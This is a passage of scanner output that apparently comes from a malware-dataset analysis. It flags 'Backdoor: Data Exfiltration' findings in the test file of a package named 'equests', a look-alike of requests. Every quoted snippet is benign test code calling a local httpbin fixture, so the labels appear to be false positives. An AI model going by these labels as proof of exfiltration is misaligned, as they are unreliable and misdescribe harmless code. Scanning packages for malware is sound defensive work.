                      "markdown": "`            {'stuff': 'elixr'.encode('utf-8')},\n        ))\n    def test_unicode_multipart_post(self, httpbin, data):\n        r = requests.post(httpbin('post'),\n            data=data,\n            files={'file': ('test_requests.py', open(__file__, 'rb'))})\n        assert r.status_code == 200\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 931,
                  "startColumn": 20,
                  "endLine": 931,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        assert prep.body == 'test=foo&test=baz'\n\n    def test_different_encodings_dont_break_post(self, httpbin):\n        r = requests.post(httpbin('post'),\n            data={'stuff': json.dumps({'a': 123})},\n            params={'blah': 'asdf1234'},\n            files={'file': ('test_requests.py', open(__file__, 'rb'))})\n",
                    "rendered": {
                      "text": "        assert prep.body == 'test=foo&test=baz'\n\n    def test_different_encodings_dont_break_post(self, httpbin):\n        r = requests.post(httpbin('post'),\n            data={'stuff': json.dumps({'a': 123})},\n            params={'blah': 'asdf1234'},\n            files={'file': ('test_requests.py', open(__file__, 'rb'))})\n",
                      "markdown": "`        assert prep.body == 'test=foo&test=baz'\n\n    def test_different_encodings_dont_break_post(self, httpbin):\n        r = requests.post(httpbin('post'),\n            data={'stuff': json.dumps({'a': 123})},\n            params={'blah': 'asdf1234'},\n            files={'file': ('test_requests.py', open(__file__, 'rb'))})\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 925,
                  "startColumn": 20,
                  "endLine": 925,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        assert r.url == httpbin('get?test=foo&test=baz')\n\n    def test_form_encoded_post_query_multivalued_element(self, httpbin):\n        r = requests.Request(method='POST', url=httpbin('post'),\n                             data=dict(test=['foo', 'baz']))\n        prep = r.prepare()\n        assert prep.body == 'test=foo&test=baz'\n",
                    "rendered": {
                      "text": "        assert r.url == httpbin('get?test=foo&test=baz')\n\n    def test_form_encoded_post_query_multivalued_element(self, httpbin):\n        r = requests.Request(method='POST', url=httpbin('post'),\n                             data=dict(test=['foo', 'baz']))\n        prep = r.prepare()\n        assert prep.body == 'test=foo&test=baz'\n",
                      "markdown": "`        assert r.url == httpbin('get?test=foo&test=baz')\n\n    def test_form_encoded_post_query_multivalued_element(self, httpbin):\n        r = requests.Request(method='POST', url=httpbin('post'),\n                             data=dict(test=['foo', 'baz']))\n        prep = r.prepare()\n        assert prep.body == 'test=foo&test=baz'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 920,
                  "startColumn": 20,
                  "endLine": 920,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n    def test_urlencoded_get_query_multivalued_param(self, httpbin):\n\n        r = requests.get(httpbin('get'), params={'test': ['foo', 'baz']})\n        assert r.status_code == 200\n        assert r.url == httpbin('get?test=foo&test=baz')\n\n",
                    "rendered": {
                      "text": "\n    def test_urlencoded_get_query_multivalued_param(self, httpbin):\n\n        r = requests.get(httpbin('get'), params={'test': ['foo', 'baz']})\n        assert r.status_code == 200\n        assert r.url == httpbin('get?test=foo&test=baz')\n\n",
                      "markdown": "`\n    def test_urlencoded_get_query_multivalued_param(self, httpbin):\n\n        r = requests.get(httpbin('get'), params={'test': ['foo', 'baz']})\n        assert r.status_code == 200\n        assert r.url == httpbin('get?test=foo&test=baz')\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 916,
                  "startColumn": 20,
                  "endLine": 916,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        with pytest.raises(SSLError):\n            # Our local httpbin does not have a trusted CA, so this call will\n            # fail if we use our default trust bundle.\n            requests.get(httpbin_secure('status', '200'))\n\n    def test_urlencoded_get_query_multivalued_param(self, httpbin):\n\n",
                    "rendered": {
                      "text": "        with pytest.raises(SSLError):\n            # Our local httpbin does not have a trusted CA, so this call will\n            # fail if we use our default trust bundle.\n            requests.get(httpbin_secure('status', '200'))\n\n    def test_urlencoded_get_query_multivalued_param(self, httpbin):\n\n",
                      "markdown": "`        with pytest.raises(SSLError):\n            # Our local httpbin does not have a trusted CA, so this call will\n            # fail if we use our default trust bundle.\n            requests.get(httpbin_secure('status', '200'))\n\n    def test_urlencoded_get_query_multivalued_param(self, httpbin):\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 900,
                  "startColumn": 20,
                  "endLine": 900,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n        with pytest.warns(None) as warning_records:\n            warnings.simplefilter('always')\n            requests.get(\"https://localhost:{}/\".format(port), verify=ca_bundle)\n\n        warning_records = [item for item in warning_records\n                           if item.category.__name__ != 'ResourceWarning']\n",
                    "rendered": {
                      "text": "\n        with pytest.warns(None) as warning_records:\n            warnings.simplefilter('always')\n            requests.get(\"https://localhost:{}/\".format(port), verify=ca_bundle)\n\n        warning_records = [item for item in warning_records\n                           if item.category.__name__ != 'ResourceWarning']\n",
                      "markdown": "`\n        with pytest.warns(None) as warning_records:\n            warnings.simplefilter('always')\n            requests.get(\"https://localhost:{}/\".format(port), verify=ca_bundle)\n\n        warning_records = [item for item in warning_records\n                           if item.category.__name__ != 'ResourceWarning']\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 885,
                  "startColumn": 20,
                  "endLine": 885,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        assert str(e.value) == 'Could not find the TLS key file, invalid path: {}'.format(INVALID_PATH)\n\n    def test_http_with_certificate(self, httpbin):\n        r = requests.get(httpbin(), cert='.')\n        assert r.status_code == 200\n\n    def test_https_warnings(self, nosan_server):\n",
                    "rendered": {
                      "text": "        assert str(e.value) == 'Could not find the TLS key file, invalid path: {}'.format(INVALID_PATH)\n\n    def test_http_with_certificate(self, httpbin):\n        r = requests.get(httpbin(), cert='.')\n        assert r.status_code == 200\n\n    def test_https_warnings(self, nosan_server):\n",
                      "markdown": "`        assert str(e.value) == 'Could not find the TLS key file, invalid path: {}'.format(INVALID_PATH)\n\n    def test_http_with_certificate(self, httpbin):\n        r = requests.get(httpbin(), cert='.')\n        assert r.status_code == 200\n\n    def test_https_warnings(self, nosan_server):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 881,
                  "startColumn": 20,
                  "endLine": 881,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        assert str(e.value) == 'Could not find the TLS certificate file, invalid path: {}'.format(INVALID_PATH)\n\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), cert=('.', INVALID_PATH))\n        assert str(e.value) == 'Could not find the TLS key file, invalid path: {}'.format(INVALID_PATH)\n\n    def test_http_with_certificate(self, httpbin):\n",
                    "rendered": {
                      "text": "        assert str(e.value) == 'Could not find the TLS certificate file, invalid path: {}'.format(INVALID_PATH)\n\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), cert=('.', INVALID_PATH))\n        assert str(e.value) == 'Could not find the TLS key file, invalid path: {}'.format(INVALID_PATH)\n\n    def test_http_with_certificate(self, httpbin):\n",
                      "markdown": "`        assert str(e.value) == 'Could not find the TLS certificate file, invalid path: {}'.format(INVALID_PATH)\n\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), cert=('.', INVALID_PATH))\n        assert str(e.value) == 'Could not find the TLS key file, invalid path: {}'.format(INVALID_PATH)\n\n    def test_http_with_certificate(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 877,
                  "startColumn": 20,
                  "endLine": 877,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    def test_invalid_ssl_certificate_files(self, httpbin_secure):\n        INVALID_PATH = '/garbage'\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), cert=INVALID_PATH)\n        assert str(e.value) == 'Could not find the TLS certificate file, invalid path: {}'.format(INVALID_PATH)\n\n        with pytest.raises(IOError) as e:\n",
                    "rendered": {
                      "text": "    def test_invalid_ssl_certificate_files(self, httpbin_secure):\n        INVALID_PATH = '/garbage'\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), cert=INVALID_PATH)\n        assert str(e.value) == 'Could not find the TLS certificate file, invalid path: {}'.format(INVALID_PATH)\n\n        with pytest.raises(IOError) as e:\n",
                      "markdown": "`    def test_invalid_ssl_certificate_files(self, httpbin_secure):\n        INVALID_PATH = '/garbage'\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), cert=INVALID_PATH)\n        assert str(e.value) == 'Could not find the TLS certificate file, invalid path: {}'.format(INVALID_PATH)\n\n        with pytest.raises(IOError) as e:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 871,
                  "startColumn": 20,
                  "endLine": 871,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    def test_invalid_ca_certificate_path(self, httpbin_secure):\n        INVALID_PATH = '/garbage'\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), verify=INVALID_PATH)\n        assert str(e.value) == 'Could not find a suitable TLS CA certificate bundle, invalid path: {}'.format(INVALID_PATH)\n\n    def test_invalid_ssl_certificate_files(self, httpbin_secure):\n",
                    "rendered": {
                      "text": "    def test_invalid_ca_certificate_path(self, httpbin_secure):\n        INVALID_PATH = '/garbage'\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), verify=INVALID_PATH)\n        assert str(e.value) == 'Could not find a suitable TLS CA certificate bundle, invalid path: {}'.format(INVALID_PATH)\n\n    def test_invalid_ssl_certificate_files(self, httpbin_secure):\n",
                      "markdown": "`    def test_invalid_ca_certificate_path(self, httpbin_secure):\n        INVALID_PATH = '/garbage'\n        with pytest.raises(IOError) as e:\n            requests.get(httpbin_secure(), verify=INVALID_PATH)\n        assert str(e.value) == 'Could not find a suitable TLS CA certificate bundle, invalid path: {}'.format(INVALID_PATH)\n\n    def test_invalid_ssl_certificate_files(self, httpbin_secure):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 866,
                  "startColumn": 16,
                  "endLine": 866,
                  "endColumn": 21,
                  "snippet": {
                    "text": "            data='\\xff')  # compat.str is unicode.\n\n    def test_pyopenssl_redirect(self, httpbin_secure, httpbin_ca_bundle):\n        requests.get(httpbin_secure('status', '301'), verify=httpbin_ca_bundle)\n\n    def test_invalid_ca_certificate_path(self, httpbin_secure):\n        INVALID_PATH = '/garbage'\n",
                    "rendered": {
                      "text": "            data='\\xff')  # compat.str is unicode.\n\n    def test_pyopenssl_redirect(self, httpbin_secure, httpbin_ca_bundle):\n        requests.get(httpbin_secure('status', '301'), verify=httpbin_ca_bundle)\n\n    def test_invalid_ca_certificate_path(self, httpbin_secure):\n        INVALID_PATH = '/garbage'\n",
                      "markdown": "`            data='\\xff')  # compat.str is unicode.\n\n    def test_pyopenssl_redirect(self, httpbin_secure, httpbin_ca_bundle):\n        requests.get(httpbin_secure('status', '301'), verify=httpbin_ca_bundle)\n\n    def test_invalid_ca_certificate_path(self, httpbin_secure):\n        INVALID_PATH = '/garbage'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 857,
                  "startColumn": 16,
                  "endLine": 857,
                  "endColumn": 21,
                  "snippet": {
                    "text": "            ('ø', {'foo': 'foo'}),\n        ))\n    def test_unicode_get(self, httpbin, url, params):\n        requests.get(httpbin(url), params=params)\n\n    def test_unicode_header_name(self, httpbin):\n        requests.put(\n",
                    "rendered": {
                      "text": "            ('ø', {'foo': 'foo'}),\n        ))\n    def test_unicode_get(self, httpbin, url, params):\n        requests.get(httpbin(url), params=params)\n\n    def test_unicode_header_name(self, httpbin):\n        requests.put(\n",
                      "markdown": "`            ('ø', {'foo': 'foo'}),\n        ))\n    def test_unicode_get(self, httpbin, url, params):\n        requests.get(httpbin(url), params=params)\n\n    def test_unicode_header_name(self, httpbin):\n        requests.put(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 845,
                  "startColumn": 20,
                  "endLine": 845,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        assert not r.ok\n\n    def test_decompress_gzip(self, httpbin):\n        r = requests.get(httpbin('gzip'))\n        r.content.decode('ascii')\n\n    @pytest.mark.parametrize(\n",
                    "rendered": {
                      "text": "        assert not r.ok\n\n    def test_decompress_gzip(self, httpbin):\n        r = requests.get(httpbin('gzip'))\n        r.content.decode('ascii')\n\n    @pytest.mark.parametrize(\n",
                      "markdown": "`        assert not r.ok\n\n    def test_decompress_gzip(self, httpbin):\n        r = requests.get(httpbin('gzip'))\n        r.content.decode('ascii')\n\n    @pytest.mark.parametrize(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 841,
                  "startColumn": 20,
                  "endLine": 841,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        with pytest.raises(requests.exceptions.HTTPError):\n            r.raise_for_status()\n\n        r = requests.get(httpbin('status', '500'))\n        assert not r.ok\n\n    def test_decompress_gzip(self, httpbin):\n",
                    "rendered": {
                      "text": "        with pytest.raises(requests.exceptions.HTTPError):\n            r.raise_for_status()\n\n        r = requests.get(httpbin('status', '500'))\n        assert not r.ok\n\n    def test_decompress_gzip(self, httpbin):\n",
                      "markdown": "`        with pytest.raises(requests.exceptions.HTTPError):\n            r.raise_for_status()\n\n        r = requests.get(httpbin('status', '500'))\n        assert not r.ok\n\n    def test_decompress_gzip(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 837,
                  "startColumn": 20,
                  "endLine": 837,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        assert not r.ok\n\n    def test_status_raising(self, httpbin):\n        r = requests.get(httpbin('status', '404'))\n        with pytest.raises(requests.exceptions.HTTPError):\n            r.raise_for_status()\n\n",
                    "rendered": {
                      "text": "        assert not r.ok\n\n    def test_status_raising(self, httpbin):\n        r = requests.get(httpbin('status', '404'))\n        with pytest.raises(requests.exceptions.HTTPError):\n            r.raise_for_status()\n\n",
                      "markdown": "`        assert not r.ok\n\n    def test_status_raising(self, httpbin):\n        r = requests.get(httpbin('status', '404'))\n        with pytest.raises(requests.exceptions.HTTPError):\n            r.raise_for_status()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 833,
                  "startColumn": 20,
                  "endLine": 833,
                  "endColumn": 25,
                  "snippet": {
                    "text": "                requests.post(url, data=u('[{\"some\": \"data\"}]'), files={'some': f})\n\n    def test_request_ok_set(self, httpbin):\n        r = requests.get(httpbin('status', '404'))\n        assert not r.ok\n\n    def test_status_raising(self, httpbin):\n",
                    "rendered": {
                      "text": "                requests.post(url, data=u('[{\"some\": \"data\"}]'), files={'some': f})\n\n    def test_request_ok_set(self, httpbin):\n        r = requests.get(httpbin('status', '404'))\n        assert not r.ok\n\n    def test_status_raising(self, httpbin):\n",
                      "markdown": "`                requests.post(url, data=u('[{\"some\": \"data\"}]'), files={'some': f})\n\n    def test_request_ok_set(self, httpbin):\n        r = requests.get(httpbin('status', '404'))\n        assert not r.ok\n\n    def test_status_raising(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 830,
                  "startColumn": 24,
                  "endLine": 830,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            with pytest.raises(ValueError):\n                requests.post(url, data='[{\"some\": \"data\"}]', files={'some': f})\n            with pytest.raises(ValueError):\n                requests.post(url, data=u('[{\"some\": \"data\"}]'), files={'some': f})\n\n    def test_request_ok_set(self, httpbin):\n        r = requests.get(httpbin('status', '404'))\n",
                    "rendered": {
                      "text": "            with pytest.raises(ValueError):\n                requests.post(url, data='[{\"some\": \"data\"}]', files={'some': f})\n            with pytest.raises(ValueError):\n                requests.post(url, data=u('[{\"some\": \"data\"}]'), files={'some': f})\n\n    def test_request_ok_set(self, httpbin):\n        r = requests.get(httpbin('status', '404'))\n",
                      "markdown": "`            with pytest.raises(ValueError):\n                requests.post(url, data='[{\"some\": \"data\"}]', files={'some': f})\n            with pytest.raises(ValueError):\n                requests.post(url, data=u('[{\"some\": \"data\"}]'), files={'some': f})\n\n    def test_request_ok_set(self, httpbin):\n        r = requests.get(httpbin('status', '404'))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 828,
                  "startColumn": 24,
                  "endLine": 828,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        url = httpbin('post')\n        with open('requirements-dev.txt') as f:\n            with pytest.raises(ValueError):\n                requests.post(url, data='[{\"some\": \"data\"}]', files={'some': f})\n            with pytest.raises(ValueError):\n                requests.post(url, data=u('[{\"some\": \"data\"}]'), files={'some': f})\n\n",
                    "rendered": {
                      "text": "        url = httpbin('post')\n        with open('requirements-dev.txt') as f:\n            with pytest.raises(ValueError):\n                requests.post(url, data='[{\"some\": \"data\"}]', files={'some': f})\n            with pytest.raises(ValueError):\n                requests.post(url, data=u('[{\"some\": \"data\"}]'), files={'some': f})\n\n",
                      "markdown": "`        url = httpbin('post')\n        with open('requirements-dev.txt') as f:\n            with pytest.raises(ValueError):\n                requests.post(url, data='[{\"some\": \"data\"}]', files={'some': f})\n            with pytest.raises(ValueError):\n                requests.post(url, data=u('[{\"some\": \"data\"}]'), files={'some': f})\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 821,
                  "startColumn": 57,
                  "endLine": 821,
                  "endColumn": 62,
                  "snippet": {
                    "text": "\n        data = CustomMapping({'some': 'data'})\n        url = httpbin('post')\n        found_json = requests.post(url, data=data).json().get('form')\n        assert found_json == {'some': 'data'}\n\n    def test_conflicting_post_params(self, httpbin):\n",
                    "rendered": {
                      "text": "\n        data = CustomMapping({'some': 'data'})\n        url = httpbin('post')\n        found_json = requests.post(url, data=data).json().get('form')\n        assert found_json == {'some': 'data'}\n\n    def test_conflicting_post_params(self, httpbin):\n",
                      "markdown": "`\n        data = CustomMapping({'some': 'data'})\n        url = httpbin('post')\n        found_json = requests.post(url, data=data).json().get('form')\n        assert found_json == {'some': 'data'}\n\n    def test_conflicting_post_params(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 821,
                  "startColumn": 29,
                  "endLine": 821,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\n        data = CustomMapping({'some': 'data'})\n        url = httpbin('post')\n        found_json = requests.post(url, data=data).json().get('form')\n        assert found_json == {'some': 'data'}\n\n    def test_conflicting_post_params(self, httpbin):\n",
                    "rendered": {
                      "text": "\n        data = CustomMapping({'some': 'data'})\n        url = httpbin('post')\n        found_json = requests.post(url, data=data).json().get('form')\n        assert found_json == {'some': 'data'}\n\n    def test_conflicting_post_params(self, httpbin):\n",
                      "markdown": "`\n        data = CustomMapping({'some': 'data'})\n        url = httpbin('post')\n        found_json = requests.post(url, data=data).json().get('form')\n        assert found_json == {'some': 'data'}\n\n    def test_conflicting_post_params(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 797,
                  "startColumn": 20,
                  "endLine": 797,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        assert post4.status_code == 200\n\n        with pytest.raises(ValueError):\n            requests.post(url, files=['bad file data'])\n\n    def test_post_with_custom_mapping(self, httpbin):\n        class CustomMapping(MutableMapping):\n",
                    "rendered": {
                      "text": "        assert post4.status_code == 200\n\n        with pytest.raises(ValueError):\n            requests.post(url, files=['bad file data'])\n\n    def test_post_with_custom_mapping(self, httpbin):\n        class CustomMapping(MutableMapping):\n",
                      "markdown": "`        assert post4.status_code == 200\n\n        with pytest.raises(ValueError):\n            requests.post(url, files=['bad file data'])\n\n    def test_post_with_custom_mapping(self, httpbin):\n        class CustomMapping(MutableMapping):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 793,
                  "startColumn": 24,
                  "endLine": 793,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            post2 = requests.post(url, data={'some': 'data'}, files={'some': f})\n        assert post2.status_code == 200\n\n        post4 = requests.post(url, data='[{\"some\": \"json\"}]')\n        assert post4.status_code == 200\n\n        with pytest.raises(ValueError):\n",
                    "rendered": {
